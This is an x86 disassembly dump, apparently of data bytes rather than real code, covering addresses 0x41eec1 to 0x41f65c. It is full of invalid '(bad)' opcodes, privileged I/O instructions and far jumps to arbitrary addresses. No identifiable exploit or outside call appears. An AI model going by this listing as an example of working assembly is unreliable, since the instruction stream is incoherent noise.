  41eec1:	or     cl,BYTE PTR [ebp-0x3f822c74]
  41eec7:	xor    eax,0x455e3136
  41eecc:	dec    esi
  41eecd:	cmp    ebx,DWORD PTR [ebp+0x114be40b]
  41eed3:	push   ebp
  41eed4:	and    edx,DWORD PTR [ecx-0x22a1f287]
  41eeda:	mov    edx,0xe6131acf
  41eedf:	push   esp
  41eee0:	js     0x41eef0
  41eee2:	lahf   
  41eee3:	xchg   ecx,eax
  41eee4:	cmp    eax,0x86abc1b0
  41eee9:	fwait
  41eeea:	lods   al,BYTE PTR ds:[esi]
  41eeeb:	mov    dl,0xf0
  41eeed:	mov    DWORD PTR [esi],esp
  41eeef:	adc    DWORD PTR [ebx+ebp*2+0x65],edx
  41eef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef4:	cdq    
  41eef5:	sbb    DWORD PTR [eax],ebx
  41eef7:	inc    edx
  41eef8:	repnz push 0xd0e5783
  41eefe:	xor    ecx,DWORD PTR [ebp+0x7a]
  41ef01:	inc    esi
  41ef02:	lods   eax,DWORD PTR ds:[esi]
  41ef03:	sbb    ch,BYTE PTR [edx]
  41ef05:	cmp    bl,BYTE PTR [ebx-0x31]
  41ef08:	loope  0x41ef16
  41ef0a:	adc    al,0xbe
  41ef0c:	sbb    cl,BYTE PTR [edx-0x5a]
  41ef0f:	sub    BYTE PTR [ecx-0x35],0x24
  41ef13:	jmp    0x41ef44
  41ef15:	sub    BYTE PTR [eax-0x4ce136e1],al
  41ef1b:	loop   0x41ef53
  41ef1d:	test   DWORD PTR [ebp+0x72],0x1a3f0343
  41ef24:	cmp    ah,dh
  41ef26:	dec    edx
  41ef27:	add    eax,0xa0598117
  41ef2c:	and    DWORD PTR [edx-0x79],ecx
  41ef2f:	into   
  41ef30:	dec    ecx
  41ef31:	add    esi,DWORD PTR [esi+0x1b]
  41ef34:	fadd   st(5),st
  41ef36:	mov    esi,0x616c8db6
  41ef3b:	sub    eax,edx
  41ef3d:	es or  al,0x53
  41ef40:	jmp    0x3fa6adb9
  41ef45:	out    dx,eax
  41ef46:	stos   BYTE PTR es:[edi],al
  41ef47:	add    DWORD PTR [ebx-0x41939b0e],esp
  41ef4d:	xchg   esp,eax
  41ef4e:	xor    al,0xa4
  41ef50:	push   0xfffffff6
  41ef52:	(bad)  
  41ef53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef54:	push   esp
  41ef55:	mov    eax,ds:0x5f8a8ecd
  41ef5a:	mov    esi,0xc85df4dd
  41ef5f:	mov    ch,BYTE PTR [edi]
  41ef61:	cwde   
  41ef62:	inc    edx
  41ef63:	mov    BYTE PTR [ebx-0x719e3fc5],al
  41ef69:	jno    0x41efb0
  41ef6b:	or     edi,DWORD PTR [edx+0x6414a443]
  41ef71:	icebp  
  41ef72:	xor    DWORD PTR [edx+0x6cca7f6b],eax
  41ef78:	mov    bl,0x48
  41ef7a:	and    ebp,DWORD PTR [edi+ebx*4]
  41ef7d:	jmp    0xcc226ac8
  41ef82:	inc    eax
  41ef83:	sub    BYTE PTR [eax+0x7e59b76],ah
  41ef89:	fld    QWORD PTR [ebx]
  41ef8b:	test   cl,0x59
  41ef8e:	sub    ch,al
  41ef90:	cdq    
  41ef91:	js     0x41efee
  41ef93:	into   
  41ef94:	sbb    cl,BYTE PTR [edx-0x35869b38]
  41ef9a:	xchg   esi,eax
  41ef9b:	sub    ebx,edi
  41ef9d:	inc    edx
  41ef9e:	into   
  41ef9f:	inc    edx
  41efa0:	int    0xbb
  41efa2:	gs mov ah,0x76
  41efa5:	loopne 0x41ef74
  41efa7:	in     al,0xb2
  41efa9:	jo     0x41ef8a
  41efab:	push   ebx
  41efac:	xchg   esp,eax
  41efad:	pushf  
  41efae:	stos   BYTE PTR es:[edi],al
  41efaf:	cmc    
  41efb0:	(bad)  
  41efb1:	aam    0xcc
  41efb3:	mov    edi,0x50781237
  41efb8:	inc    BYTE PTR [edi-0x26f66aca]
  41efbe:	enter  0x85ff,0x5a
  41efc2:	jle    0x41f019
  41efc4:	cwde   
  41efc5:	pop    es
  41efc6:	xchg   esi,eax
  41efc7:	or     BYTE PTR [esi],bl
  41efc9:	repnz aaa 
  41efcb:	out    0x65,eax
  41efcd:	in     al,dx
  41efce:	icebp  
  41efcf:	and    eax,0x91bd14ad
  41efd5:	ret    
  41efd6:	inc    DWORD PTR [edi+0x5a449f25]
  41efdc:	jge    0x41f001
  41efde:	jl     0x41efaa
  41efe0:	mov    ?,edx
  41efe2:	bound  ebp,QWORD PTR [ebx]
  41efe4:	jg     0x41ef74
  41efe6:	cld    
  41efe7:	ja     0x41f02e
  41efe9:	out    dx,al
  41efea:	xor    eax,0x12edb188
  41efef:	dec    esp
  41eff0:	pop    ss
  41eff1:	js     0x41efca
  41eff3:	nop
  41eff4:	inc    ebx
  41eff5:	aad    0x98
  41eff7:	dec    edi
  41eff8:	pop    esi
  41eff9:	stc    
  41effa:	push   edx
  41effb:	xor    DWORD PTR [ecx],0xea7f0f97
  41f001:	scas   al,BYTE PTR es:[edi]
  41f002:	and    eax,0xd77c6457
  41f007:	add    BYTE PTR [esi],0x8a
  41f00a:	sub    esp,eax
  41f00c:	sbb    esi,esp
  41f00e:	and    ebp,DWORD PTR [eax+0x70]
  41f011:	inc    esi
  41f012:	cwde   
  41f013:	mov    BYTE PTR [ecx-0x15f128fc],dh
  41f019:	fs es xchg esi,eax
  41f01c:	das    
  41f01d:	mov    ebp,0x2c5a9cb7
  41f022:	mov    ecx,0xb8cfd9e7
  41f027:	int3   
  41f028:	out    dx,eax
  41f029:	addr16 loop 0x41f086
  41f02c:	cmp    eax,ecx
  41f02e:	adc    al,0x91
  41f030:	cdq    
  41f031:	js     0x41f051
  41f033:	adc    al,0xad
  41f035:	dec    ebx
  41f036:	daa    
  41f037:	sub    DWORD PTR [edi+0x2c6e7df5],edi
  41f03d:	js     0x41f03e
  41f03f:	cmp    esi,DWORD PTR [edx+esi*8]
  41f042:	sti    
  41f043:	pop    ebx
  41f044:	mov    ebx,0xa711fcbf
  41f049:	fwait
  41f04a:	cwde   
  41f04b:	ja     0x41f068
  41f04d:	cmp    BYTE PTR ds:0xc3bd0d25,ch
  41f053:	mov    dl,0x6d
  41f055:	iret   
  41f056:	pop    edi
  41f057:	push   eax
  41f058:	jne    0x41efe7
  41f05a:	mov    al,BYTE PTR [edx+ebp*1]
  41f05d:	(bad)  
  41f05f:	adc    DWORD PTR [ebp+edi*4-0x68a21a8],0xffffffd1
  41f067:	pop    ecx
  41f068:	push   cs
  41f069:	lock call 0xbd6d3908
  41f06f:	xchg   edx,eax
  41f070:	dec    esi
  41f071:	popf   
  41f072:	call   0xcf:0x159f2323
  41f079:	aam    0x4d
  41f07b:	sbb    eax,ebp
  41f07d:	pop    ebx
  41f07e:	repz cdq 
  41f080:	jmp    0xe34e:0xf0a699ec
  41f087:	aam    0xc3
  41f089:	clc    
  41f08a:	aaa    
  41f08b:	mov    esi,0xc95d7082
  41f090:	out    dx,eax
  41f091:	es in  al,0x1b
  41f094:	mov    ebp,0x86500c5a
  41f099:	and    eax,0xcb445bcd
  41f09e:	xor    ebx,esp
  41f0a0:	or     al,0xb1
  41f0a2:	xchg   edx,eax
  41f0a3:	xchg   ecx,eax
  41f0a4:	or     BYTE PTR [edx+ecx*2],0x5f
  41f0a8:	int3   
  41f0a9:	mov    ds:0x90d8e52e,eax
  41f0ae:	sbb    al,0xca
  41f0b0:	outs   dx,BYTE PTR ds:[esi]
  41f0b1:	icebp  
  41f0b2:	test   esi,ebp
  41f0b4:	idiv   BYTE PTR [eax]
  41f0b6:	push   es
  41f0b7:	add    DWORD PTR ss:[eax-0x10],ebx
  41f0bb:	stc    
  41f0bc:	test   BYTE PTR [ebp-0x5d],bh
  41f0bf:	into   
  41f0c0:	cmp    ah,BYTE PTR [esi]
  41f0c2:	mov    cl,0xd5
  41f0c4:	pop    esi
  41f0c5:	js     0x41f0f5
  41f0c7:	sub    edi,edi
  41f0c9:	sar    DWORD PTR [esi],cl
  41f0cb:	rcr    BYTE PTR [ebp+0x77a37b2a],cl
  41f0d1:	jmp    0x471be35b
  41f0d6:	add    edi,ecx
  41f0d8:	mov    edx,0xf46355ff
  41f0dd:	jae    0x41f0b0
  41f0df:	add    ebx,eax
  41f0e1:	dec    ecx
  41f0e2:	lods   al,BYTE PTR ds:[esi]
  41f0e3:	mov    esp,DWORD PTR [ebx]
  41f0e5:	xchg   edi,eax
  41f0e6:	fisubr WORD PTR [ecx+0x5a]
  41f0e9:	and    DWORD PTR [edi-0x5440935f],eax
  41f0ef:	xchg   esp,eax
  41f0f0:	mov    ecx,0x8fca294f
  41f0f5:	cmc    
  41f0f6:	dec    edi
  41f0f7:	cmp    DWORD PTR [esi],esp
  41f0f9:	cmp    eax,0xb0859dc4
  41f0fe:	xchg   DWORD PTR [eax],esi
  41f100:	test   eax,0xbab93551
  41f105:	cli    
  41f106:	or     BYTE PTR ds:0x90174b07,0xbd
  41f10d:	cmp    BYTE PTR [ebp+0x24],0xae
  41f111:	fcom   QWORD PTR [eax-0x31]
  41f114:	fwait
  41f115:	push   ss
  41f116:	inc    eax
  41f117:	mov    cl,bh
  41f119:	inc    esi
  41f11a:	mov    dl,0xbd
  41f11c:	add    eax,0x9da15db1
  41f121:	jmp    0x41f13c
  41f123:	add    eax,0xf9d7412c
  41f128:	leave  
  41f129:	cs (bad) 
  41f12b:	jle    0x41f1a1
  41f12d:	xchg   edi,eax
  41f12e:	cmp    BYTE PTR [ecx+0x70],0x72
  41f132:	out    0x75,al
  41f134:	dec    ebp
  41f135:	push   es
  41f136:	mov    edx,0x6fc6ac54
  41f13b:	ficom  WORD PTR [eax-0x6be133b1]
  41f141:	or     BYTE PTR ds:0xa8174663,dh
  41f147:	xchg   esi,eax
  41f148:	adc    eax,0x5ba33b2c
  41f14d:	iret   
  41f14e:	add    DWORD PTR [edx-0x17b697f5],esp
  41f154:	mov    ebx,0x6d7b1356
  41f159:	pusha  
  41f15a:	cld    
  41f15b:	xor    al,0x59
  41f15d:	add    dh,dh
  41f15f:	cs rcl esi,0x5e
  41f163:	adc    bh,BYTE PTR [ecx-0x42404ef]
  41f169:	test   eax,0x6cb1c9e8
  41f16e:	lahf   
  41f16f:	or     cl,dl
  41f171:	mov    ebp,0x5b9eb088
  41f176:	or     al,0x82
  41f178:	outs   dx,BYTE PTR ds:[esi]
  41f179:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41f17b:	out    0x4f,eax
  41f17d:	ins    DWORD PTR es:[edi],dx
  41f17e:	mov    dh,BYTE PTR [edx-0x5ff349b]
  41f184:	jle    0x41f122
  41f186:	adc    cl,BYTE PTR [edi+0x1a]
  41f189:	pusha  
  41f18a:	in     al,dx
  41f18b:	jns    0x41f1e0
  41f18d:	or     edx,DWORD PTR [esi]
  41f18f:	sbb    BYTE PTR [esi+0x7e],bl
  41f192:	es popf 
  41f194:	fidivr WORD PTR fs:[eax-0x5114ac6d]
  41f19b:	mov    al,ds:0xd4d170bb
  41f1a0:	dec    BYTE PTR [edx+0x6c]
  41f1a3:	pop    esp
  41f1a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a5:	push   eax
  41f1a6:	ret    
  41f1a7:	(bad)  
  41f1a8:	test   eax,0xaa8f6749
  41f1ad:	(bad)  
  41f1b0:	outs   dx,BYTE PTR ds:[esi]
  41f1b1:	scas   eax,DWORD PTR es:[edi]
  41f1b2:	pop    ebp
  41f1b3:	cmp    eax,DWORD PTR [ebx]
  41f1b5:	in     al,0x24
  41f1b7:	pop    edi
  41f1b8:	mov    BYTE PTR ds:0xd578a199,dh
  41f1be:	or     DWORD PTR [edx],esi
  41f1c0:	pop    ss
  41f1c1:	ds stos BYTE PTR es:[edi],al
  41f1c3:	mov    bh,0xd
  41f1c5:	pop    edx
  41f1c6:	pop    ebx
  41f1c7:	sub    bl,BYTE PTR fs:[ecx+0x59]
  41f1cb:	popa   
  41f1cc:	sbb    eax,0x1063a5d4
  41f1d1:	in     eax,dx
  41f1d2:	adc    eax,0xacbe61e
  41f1d7:	mov    cl,BYTE PTR [ecx-0x34]
  41f1da:	adc    dl,BYTE PTR [edx]
  41f1dc:	mov    bh,0x88
  41f1de:	dec    edx
  41f1df:	retf   0x8a7c
  41f1e2:	mov    edi,esi
  41f1e4:	mov    bh,0xa0
  41f1e6:	mul    ebx
  41f1e8:	adc    BYTE PTR [ebx+0x3a254c27],0xc7
  41f1ef:	sub    eax,0xcf4b735
  41f1f4:	lods   eax,DWORD PTR ds:[esi]
  41f1f5:	push   ecx
  41f1f6:	sub    ebx,ebp
  41f1f8:	lods   al,BYTE PTR ds:[esi]
  41f1f9:	fst    QWORD PTR [ecx]
  41f1fb:	call   0x86f9f289
  41f200:	mov    cs,esi
  41f202:	ins    DWORD PTR es:[edi],dx
  41f203:	in     eax,dx
  41f204:	xchg   BYTE PTR [ecx+0x31],ch
  41f207:	add    eax,0x58cde440
  41f20c:	aas    
  41f20d:	jge    0x41f1e4
  41f20f:	xor    ch,al
  41f211:	sti    
  41f212:	ins    DWORD PTR es:[edi],dx
  41f213:	or     BYTE PTR [ecx+0x2838c3c7],ch
  41f219:	jp     0x41f19b
  41f21b:	pop    ebx
  41f21c:	dec    eax
  41f21d:	jo     0x41f1f1
  41f21f:	loop   0x41f250
  41f221:	jl     0x41f22a
  41f223:	and    al,0xd7
  41f225:	jae    0x41f1dc
  41f227:	adc    DWORD PTR [esi+0x6f3f85f2],esp
  41f22d:	pop    ebx
  41f22e:	mov    BYTE PTR [ebp+0x6c],ah
  41f231:	jnp    0x41f289
  41f233:	popf   
  41f234:	aad    0x88
  41f236:	xchg   DWORD PTR fs:[ebx],edx
  41f239:	jl     0x41f28b
  41f23b:	mov    ecx,0x3dc83b36
  41f240:	push   0x4351ebc8
  41f245:	mov    esp,edi
  41f247:	xor    edx,DWORD PTR [edi]
  41f249:	(bad)  
  41f24a:	ins    DWORD PTR es:[edi],dx
  41f24b:	ret    0x67cf
  41f24e:	out    0x46,eax
  41f250:	dec    esi
  41f251:	and    eax,0x54c54d68
  41f256:	push   es
  41f257:	jg     0x41f2d4
  41f259:	leave  
  41f25a:	fcmovnu st,st(1)
  41f25c:	push   ebp
  41f25d:	fxch   st(4)
  41f25f:	stos   DWORD PTR es:[edi],eax
  41f260:	mov    dl,0x36
  41f262:	inc    ecx
  41f263:	fs int 0x18
  41f266:	call   0x52c95f72
  41f26b:	push   ebp
  41f26c:	int    0x96
  41f26e:	int3   
  41f26f:	pop    esi
  41f270:	cld    
  41f271:	and    edx,esp
  41f273:	adc    cl,ch
  41f275:	mov    dl,0xcb
  41f277:	pop    ds
  41f278:	push   ecx
  41f279:	jno    0x41f2d3
  41f27b:	mov    ecx,0x771fa2cc
  41f280:	ret    
  41f281:	cmp    eax,0x52f45e44
  41f286:	push   edx
  41f287:	lods   al,BYTE PTR ds:[esi]
  41f288:	sub    BYTE PTR [edi-0x12],bl
  41f28b:	iret   
  41f28c:	stos   DWORD PTR es:[edi],eax
  41f28d:	sbb    dh,BYTE PTR [edx-0x23]
  41f290:	sbb    DWORD PTR ds:0xad302558,esi
  41f296:	int3   
  41f297:	jl     0x41f26c
  41f299:	inc    si
  41f29b:	inc    edx
  41f29c:	clc    
  41f29d:	dec    esi
  41f29e:	lea    ecx,[edi-0x56f9cf28]
  41f2a4:	inc    esi
  41f2a5:	ror    DWORD PTR [ecx-0x50],0xe6
  41f2a9:	sbb    dh,BYTE PTR [esi+edi*1+0x15]
  41f2ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ae:	call   0x440d577
  41f2b3:	fmul   st,st(0)
  41f2b6:	dec    edx
  41f2b7:	imul   ecx,DWORD PTR [ebx-0x33],0x76748aa0
  41f2be:	push   eax
  41f2bf:	mov    ds:0x60763865,eax
  41f2c4:	xchg   edx,eax
  41f2c5:	cs scas eax,DWORD PTR es:[edi]
  41f2c7:	dec    esp
  41f2c8:	adc    eax,0x93ff2292
  41f2cd:	ds mov esp,0x744870cf
  41f2d3:	xor    DWORD PTR [ecx-0x16d3cb01],0xffffffec
  41f2da:	stos   DWORD PTR es:[edi],eax
  41f2db:	bound  ecx,QWORD PTR [esi+0x6b2a185f]
  41f2e1:	(bad)  
  41f2e3:	pushf  
  41f2e4:	retf   
  41f2e5:	mov    ecx,0x285aee73
  41f2ea:	lock lahf 
  41f2ec:	call   0xcad5a345
  41f2f1:	cdq    
  41f2f2:	fstp   TBYTE PTR [eax+0x650fabb9]
  41f2f8:	pop    DWORD PTR ds:0x285d59c9
  41f2fe:	les    ecx,FWORD PTR [ebx-0x28]
  41f301:	imul   esp,DWORD PTR [eax-0x5b],0x84193aa
  41f308:	adc    DWORD PTR [eax+0x2b4a9360],ebx
  41f30e:	pop    edx
  41f30f:	les    esi,FWORD PTR [edx+0x29]
  41f312:	pop    ecx
  41f313:	ins    BYTE PTR es:[edi],dx
  41f314:	icebp  
  41f315:	mov    al,0x6a
  41f317:	push   ss
  41f318:	fidiv  DWORD PTR [ebp-0x7e]
  41f31b:	test   al,0xfb
  41f31d:	cmp    dh,BYTE PTR ds:0x2e5cb12b
  41f323:	sbb    DWORD PTR [ebx+ecx*2-0x8],edi
  41f327:	out    dx,al
  41f328:	lea    edi,[ecx]
  41f32a:	cdq    
  41f32b:	inc    edx
  41f32c:	push   cs
  41f32d:	pop    esi
  41f32e:	jno    0x41f358
  41f330:	adc    BYTE PTR [esi+ebx*8],ah
  41f333:	enter  0x49f1,0xb7
  41f337:	imul   ebx,DWORD PTR [ebp+eax*1+0x42],0xb3fe7586
  41f33f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41f341:	ss enter 0xffe1,0xd7
  41f346:	bound  eax,QWORD PTR [edi+0x67]
  41f349:	xor    eax,0x75849bd3
  41f34e:	adc    ebp,DWORD PTR [esi-0x6b]
  41f351:	(bad)  [edx]
  41f353:	pop    ebp
  41f354:	fild   QWORD PTR [eax+ecx*2]
  41f357:	sar    DWORD PTR ds:0x26c26cdb,0x19
  41f35e:	dec    ebp
  41f35f:	mov    al,ds:0xc7f648ad
  41f364:	or     cl,BYTE PTR [ebp+0x6b]
  41f367:	mov    esi,DWORD PTR [edx+0x41d115f6]
  41f36d:	pop    ds
  41f36e:	lods   eax,DWORD PTR ds:[esi]
  41f36f:	and    al,0x68
  41f371:	sbb    al,0x53
  41f373:	loop   0x41f2fa
  41f375:	test   BYTE PTR [ebx],dl
  41f377:	iret   
  41f378:	enter  0x1461,0x7f
  41f37c:	enter  0x25ed,0xae
  41f380:	mov    esp,0x2f152952
  41f385:	int3   
  41f386:	jo     0x41f37c
  41f388:	adc    eax,0xbbae60bf
  41f38d:	sub    dl,BYTE PTR [edi+0x33fd2752]
  41f393:	cmp    esi,ebx
  41f395:	cmp    BYTE PTR [ecx-0x6e4621d9],0xc3
  41f39c:	push   ds
  41f39d:	test   DWORD PTR [ebp-0x73],ebp
  41f3a0:	es jae 0x41f416
  41f3a3:	rcr    BYTE PTR [eax-0x22],1
  41f3a6:	fisub  DWORD PTR ds:0x709498ef
  41f3ac:	ret    
  41f3ad:	and    al,BYTE PTR [eax+0x2b]
  41f3b0:	cld    
  41f3b1:	sub    BYTE PTR [eax-0x76983022],0x6d
  41f3b8:	lods   al,BYTE PTR ds:[esi]
  41f3b9:	dec    esp
  41f3ba:	sbb    al,0x15
  41f3bc:	ret    
  41f3bd:	mov    eax,0x8088ac23
  41f3c2:	and    eax,0xec428609
  41f3c7:	in     al,0x28
  41f3c9:	mov    al,BYTE PTR [esp+ebp*1-0x28a3fe91]
  41f3d0:	or     DWORD PTR [ebx],edi
  41f3d2:	dec    edi
  41f3d3:	add    DWORD PTR [edi+0x51],ebx
  41f3d6:	sbb    bl,BYTE PTR [ebp+esi*2-0xf1690fa]
  41f3dd:	sti    
  41f3de:	xchg   ebp,eax
  41f3df:	pop    ss
  41f3e0:	sbb    ah,BYTE PTR [edx-0x4fb466e4]
  41f3e6:	(bad)  
  41f3e7:	les    ecx,FWORD PTR [esi+esi*8]
  41f3ea:	ret    
  41f3eb:	(bad)  
  41f3ec:	stos   BYTE PTR es:[edi],al
  41f3ed:	jmp    0x5d7e:0x157d74b5
  41f3f4:	loopne 0x41f424
  41f3f6:	into   
  41f3f7:	sbb    bl,BYTE PTR [esi]
  41f3f9:	inc    ebx
  41f3fa:	rcr    BYTE PTR [eax],1
  41f3fc:	sub    dh,ah
  41f3fe:	push   0x54db857c
  41f403:	inc    edi
  41f404:	test   al,0x43
  41f406:	jbe    0x41f3d2
  41f408:	sub    DWORD PTR [ebp-0x7a44327f],eax
  41f40e:	fcomp  DWORD PTR [edx+0x16f3bac5]
  41f414:	push   ebp
  41f415:	xor    DWORD PTR [edi-0x595b5cf8],esi
  41f41b:	sbb    BYTE PTR [edi-0x7],0x4e
  41f41f:	xor    DWORD PTR [ebp+0x62f7c7a0],ebp
  41f425:	and    eax,0x2be2bdc0
  41f42a:	test   DWORD PTR [ecx+0x2c9c4c42],ebx
  41f430:	ror    BYTE PTR [ebx+0x24bfe5e0],cl
  41f436:	push   0x76
  41f438:	jo     0x41f459
  41f43a:	mov    ebx,0x6ffc5659
  41f43f:	ja     0x41f434
  41f441:	icebp  
  41f442:	push   ss
  41f443:	xchg   ebp,eax
  41f444:	in     al,dx
  41f445:	xor    BYTE PTR fs:[eax],al
  41f448:	xchg   ebx,eax
  41f449:	xchg   esi,eax
  41f44a:	xlat   BYTE PTR ds:[ebx]
  41f44b:	je     0x41f3dd
  41f44d:	inc    eax
  41f44e:	pop    edx
  41f44f:	push   edx
  41f450:	push   cs
  41f451:	outs   dx,DWORD PTR ds:[esi]
  41f452:	(bad)  
  41f453:	ins    DWORD PTR es:[edi],dx
  41f454:	inc    esp
  41f455:	aas    
  41f456:	dec    edx
  41f457:	sbb    al,0xab
  41f459:	fiadd  DWORD PTR [eax-0x5b]
  41f45c:	push   eax
  41f45d:	rcl    BYTE PTR [ecx+0x53f865ec],1
  41f463:	inc    edx
  41f464:	js     0x41f41b
  41f466:	jp     0x41f3f1
  41f468:	loopne 0x41f4bb
  41f46a:	sub    eax,0x4ffd8856
  41f46f:	out    dx,eax
  41f470:	jmp    0x41f4de
  41f472:	lods   al,BYTE PTR ds:[esi]
  41f473:	ds adc bh,BYTE PTR fs:[ecx]
  41f477:	lods   eax,DWORD PTR ds:[esi]
  41f478:	(bad)  [ebx+ecx*1+0x53140b54]
  41f47f:	cli    
  41f480:	push   ebx
  41f481:	xchg   ebx,eax
  41f482:	sub    eax,0x727d5a03
  41f487:	mov    ecx,0x154a6d48
  41f48c:	pop    eax
  41f48d:	dec    ecx
  41f48e:	dec    ebx
  41f48f:	cdq    
  41f490:	(bad)  
  41f491:	xchg   edi,eax
  41f492:	test   BYTE PTR [eax+edi*4+0x165023bb],al
  41f499:	jl     0x41f502
  41f49b:	fild   DWORD PTR [ebx]
  41f49d:	mov    edx,0xd52b6b4b
  41f4a2:	add    al,0x52
  41f4a4:	shl    ebx,0xab
  41f4a7:	mov    ebx,0xb4b267e2
  41f4ac:	fsubrp st(6),st
  41f4ae:	cwde   
  41f4af:	jns    0x41f4b0
  41f4b1:	lea    esi,ds:0xdc575381
  41f4b7:	sbb    eax,0xf27f1763
  41f4bc:	rcr    DWORD PTR [edx],cl
  41f4be:	jmp    0x261ed4b0
  41f4c3:	mov    dl,0x7d
  41f4c5:	jle    0x41f448
  41f4c7:	jecxz  0x41f479
  41f4c9:	cmp    BYTE PTR [edx+0x2a],0xe3
  41f4cd:	rcl    BYTE PTR [ecx-0x4792fe],cl
  41f4d3:	jno    0x41f4b4
  41f4d5:	call   0x7913:0x35a0e546
  41f4dc:	das    
  41f4dd:	dec    edx
  41f4de:	shl    DWORD PTR [ebx],1
  41f4e0:	xchg   edi,eax
  41f4e1:	or     cl,BYTE PTR ds:0x304b5c8d
  41f4e7:	popf   
  41f4e8:	mov    al,0x1d
  41f4ea:	test   BYTE PTR [edx+eax*4-0xb82cea1],0x8f
  41f4f2:	in     eax,dx
  41f4f3:	daa    
  41f4f4:	cmp    BYTE PTR [esi],bl
  41f4f6:	mov    eax,ds:0x9d222704
  41f4fb:	inc    eax
  41f4fc:	(bad)  
  41f4fd:	jmp    0x41f4d5
  41f4ff:	mov    esi,0x4be0c6c6
  41f504:	in     eax,dx
  41f505:	das    
  41f506:	inc    esi
  41f507:	cmc    
  41f508:	pop    edx
  41f509:	lds    eax,FWORD PTR [esi+0x72687f85]
  41f50f:	mov    esi,0xf890f2e4
  41f514:	xor    ah,al
  41f516:	es stos DWORD PTR es:[edi],eax
  41f518:	jmp    0x41f58c
  41f51a:	test   DWORD PTR [edi+0x6a379910],0xd469b7ec
  41f524:	dec    edi
  41f525:	sar    BYTE PTR [ebx],cl
  41f527:	iret   
  41f528:	sub    eax,0x97e82508
  41f52d:	(bad)  
  41f52e:	(bad)  
  41f52f:	jbe    0x41f5a2
  41f531:	dec    ebp
  41f532:	fucomi st,st(1)
  41f534:	sahf   
  41f535:	sbb    dh,al
  41f537:	xchg   esi,eax
  41f538:	xchg   BYTE PTR [edi],bl
  41f53a:	(bad)  
  41f53b:	push   esp
  41f53c:	sbb    edx,DWORD PTR [ecx-0x6e8f925b]
  41f542:	xor    al,0x8d
  41f544:	inc    ecx
  41f545:	push   ecx
  41f546:	jp     0x41f4e2
  41f548:	push   edi
  41f549:	sbb    BYTE PTR [ebx+0x41],cl
  41f54c:	fld    TBYTE PTR [edx+0x46]
  41f54f:	cmp    eax,0x757e3020
  41f554:	mov    bh,0xfd
  41f556:	xchg   al,cl
  41f558:	pop    esi
  41f559:	push   eax
  41f55a:	enter  0x9f82,0xf
  41f55e:	je     0x41f583
  41f560:	shr    BYTE PTR [esi+0x65],cl
  41f563:	shr    BYTE PTR [edx+0x69330dc0],cl
  41f569:	add    ecx,edx
  41f56b:	dec    eax
  41f56c:	aas    
  41f56d:	xchg   esi,eax
  41f56e:	sub    bh,bh
  41f570:	leave  
  41f571:	clc    
  41f572:	pushf  
  41f573:	pop    es
  41f574:	inc    ebp
  41f575:	and    esi,ecx
  41f577:	mov    ds:0xa053cfd8,al
  41f57c:	(bad)  
  41f57d:	jne    0x41f5df
  41f57f:	adc    BYTE PTR [ecx-0x275eb219],0xa2
  41f586:	sub    eax,0x2f0fa20a
  41f58b:	mov    al,0x46
  41f58d:	jae    0x41f5c3
  41f58f:	xor    eax,0xf59a18d
  41f594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f595:	jne    0x41f565
  41f597:	xchg   edx,eax
  41f598:	shl    DWORD PTR [edi-0x73b2c57b],1
  41f59e:	inc    ebx
  41f59f:	dec    esp
  41f5a0:	xchg   edx,eax
  41f5a1:	popf   
  41f5a2:	inc    DWORD PTR [edx]
  41f5a4:	and    eax,0xd1f4c3ae
  41f5a9:	ud0    esp,edx
  41f5ac:	mov    esi,0xf6049a47
  41f5b1:	sub    eax,0x284e4fdc
  41f5b6:	cmp    al,0x49
  41f5b8:	add    DWORD PTR [ebx],ebp
  41f5ba:	jmp    0xe30b:0x878471b1
  41f5c1:	cs dec edi
  41f5c3:	and    BYTE PTR [esi-0x46],bl
  41f5c6:	mov    bh,0xbf
  41f5c8:	addr16 sbb ebp,ebx
  41f5cb:	push   ebx
  41f5cc:	push   0x54
  41f5ce:	jl     0x41f5e5
  41f5d0:	push   edi
  41f5d1:	ret    0x9981
  41f5d4:	jg     0x41f579
  41f5d6:	mov    dl,0xaa
  41f5d8:	dec    edx
  41f5d9:	sub    al,0xaa
  41f5db:	js     0x41f64b
  41f5dd:	lods   al,BYTE PTR ds:[esi]
  41f5de:	jmp    0xc6d7:0xf89921f1
  41f5e5:	cmp    cl,BYTE PTR [ebx-0x32]
  41f5e8:	fld    TBYTE PTR [esi+esi*4-0x37d8cda4]
  41f5ef:	fbstp  TBYTE PTR [edi-0x6f]
  41f5f2:	and    edi,edi
  41f5f4:	stos   BYTE PTR es:[edi],al
  41f5f5:	in     al,dx
  41f5f6:	mov    cl,0xba
  41f5f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5f9:	daa    
  41f5fa:	(bad)  
  41f5fc:	push   ebp
  41f5fd:	sbb    al,BYTE PTR [ebp-0x42]
  41f600:	jmp    0x6bbf7ff3
  41f605:	repz (bad) 
  41f607:	stos   BYTE PTR es:[edi],al
  41f608:	or     al,0x5d
  41f60a:	and    DWORD PTR [eax-0x30],ecx
  41f60d:	outs   dx,DWORD PTR ds:[esi]
  41f60e:	aam    0x5d
  41f610:	sub    DWORD PTR [eax+eax*8],esp
  41f613:	arpl   WORD PTR [ebx],di
  41f615:	fs pop ecx
  41f617:	lahf   
  41f618:	stos   DWORD PTR es:[edi],eax
  41f619:	cmp    dh,dl
  41f61b:	dec    esi
  41f61c:	sub    eax,0x4c224a4a
  41f621:	fisub  DWORD PTR [ecx-0x61c1f20f]
  41f627:	js     0x41f5fa
  41f629:	mov    cl,0x5b
  41f62b:	adc    edx,DWORD PTR [esi-0x7e]
  41f62e:	mov    ecx,0xc5979a79
  41f633:	pop    ebx
  41f634:	cmp    dl,al
  41f636:	imul   esi,DWORD PTR [eax-0x5e048cad],0xffffff91
  41f63d:	mov    dh,0x23
  41f63f:	das    
  41f640:	and    bl,cl
  41f642:	mov    al,0x8a
  41f644:	sbb    al,ah
  41f646:	aam    0x9e
  41f648:	arpl   ax,di
  41f64a:	dec    esi
  41f64b:	cmp    edi,DWORD PTR [ebx-0x2796cc9b]
  41f651:	sbb    cl,BYTE PTR [ebp+0xee962c9]
  41f657:	test   esi,ecx
  41f659:	popf   
  41f65a:	adc    al,0xd7
  41f65c:	dec    esi
